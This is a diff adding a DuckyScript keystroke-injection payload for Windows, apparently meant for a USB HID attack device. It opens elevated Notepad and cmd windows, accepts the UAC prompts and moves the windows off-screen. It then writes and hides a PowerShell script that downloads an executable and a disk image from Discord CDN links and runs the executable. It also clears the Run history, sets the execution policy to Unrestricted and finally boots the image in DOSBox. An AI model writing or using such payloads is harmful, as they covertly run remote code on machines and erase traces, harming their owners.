@@ -1,0 +1,96 @@
+DELAY 500
+GUI r 
+DELAY 150
+STRING powershell Start-Process notepad -Verb runAs
+ENTER
+DELAY 700
+ALT y
+DELAY 200
+ENTER
+ALT SPACE 
+DELAY 20
+STRING m 
+DELAY 100
+DOWNARROW
+REPEAT 100
+ENTER
+STRING (New-Object Net.Webclient).DownloadFile('https://cdn.discordapp.com/attachments/328931613180428289/681252670937366531/SERENIA.IMG',"C:\ProgramData\serenia.img");
+ENTER
+STRING (New-Object Net.Webclient).DownloadFile('https://cdn.discordapp.com/attachments/328931613180428289/681256286641324185/13704.exe',"C:\ProgramData\1337.exe"); Start-Process -FilePath "C:\ProgramData\1337.exe"
+ENTER
+STRING Remove-Item $MyINvocation.InvocationName 
+ENTER
+CTRL s
+DELAY 100
+STRING C:\Windows\config-1337.ps1
+ENTER
+DELAY 200
+ALT F4 
+DELAY 200  
+GUI r 
+DELAY 150  
+STRING powershell Start-Process cmd -Verb runAs 
+ENTER
+DELAY 700
+ALT y
+DELAY 200  
+ENTER
+STRING mode con:cols=15 lines=1 
+ENTER
+ALT SPACE 
+DELAY 150  
+STRING m 
+DELAY 150   
+DOWNARROW 
+REPEAT 100
+ENTER
+REM Clear the Run history and exit
+STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+ENTER
+DELAY 100
+STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false
+ENTER
+DELAY 100
+STRING powershell.exe -windowstyle hidden -File C:\Windows\config-1337.ps1
+ENTER
+DELAY 1500
+TAB
+DELAY 20
+TAB
+DELAY 20
+TAB
+DELAY 20
+TAB
+DELAY 20
+SPACE
+DELAY 20
+TAB
+DELAY 20
+TAB
+DELAY 20
+SPACE
+DELAY 20
+TAB
+DELAY 20
+TAB
+DELAY 20
+TAB
+DELAY 20
+SPACE
+DELAY 500
+SPACE
+DELAY 50
+SPACE
+DELAY 100
+GUI r
+DELAY 100
+STRING "C:\Program Files (x86)\DOSBox-0.74-3\DOSBox.exe"
+ENTER
+DELAY 1700
+STRING MOUNT C C:\ProgramData\
+ENTER
+STRING C:
+ENTER
+STRING boot serenia.img
+ENTER
+ALT ENTER
